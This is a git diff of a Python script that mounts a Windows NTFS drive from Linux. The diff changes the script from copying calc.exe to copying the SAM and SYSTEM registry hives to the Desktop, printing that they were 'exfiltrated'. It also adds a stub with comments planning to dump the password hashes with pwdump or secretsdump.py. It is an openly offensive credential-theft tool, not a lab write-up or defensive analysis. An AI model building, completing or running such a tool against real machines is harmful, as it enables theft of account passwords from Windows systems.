@@ -6,7 +6,6 @@
 
 import sys
 import subprocess
-import os
 import argparse
 import time
 
@@ -52,13 +51,18 @@ def locate_winfs(drives):
     return win_drives
 
 def mount_drive(drive):
-    #should refactor to accept input for /media/drivetype
-    subprocess.Popen(["sudo mount -t ntfs-3g -o nls=utf8,uid=1000,gid=1000,dmask=027,fmask=137 {} /media/windows".format(drive.get_source()), "/etc/services"], shell=True)
+    #should refactor to accept input for /media/drivetype to exploit different file systems
+    
+    subprocess.Popen(["sudo mount -t ntfs-3g -o nls=utf8 {} /media/windows".format(drive.get_source()), "/etc/services"], shell=True)
     time.sleep(1)
 
 def find_winpayload():
-    subprocess.call('cp /media/windows/Windows/System32/calc.exe /home/zigmo/Desktop/', shell=True)
-    print('Payload has been succesfully exfiltrated to ~/Desktop')
+    subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
+    subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
+
+    print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+    # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
+    # them. This will be slow but very cool
 
 def storewin_drives(raw_win_drives):
     win_drives = []
@@ -76,8 +80,11 @@ def storewin_drives(raw_win_drives):
         win_drives.append(temp_drive)
     return win_drives
 
-
-
+def dump_hashes():
+    #incorporate pwdump or secretsdump.py to dump the hashes to the screen or a file
+    # mayb use pwdump if host onl8y has local hashed but use secretsdump if it is a 
+    # domain controller.
+    pass
 
 
 def main():
@@ -87,7 +94,6 @@ def main():
     args = parser.parse_args()
     
     drives = grab_drives()
-
 
     if args.exfil_win:
         drive_count = 0
@@ -107,7 +113,7 @@ def main():
     else:
         print("invalid flag")
 
-
+    # dump_hashes()
  
 
 if __name__ == '__main__':
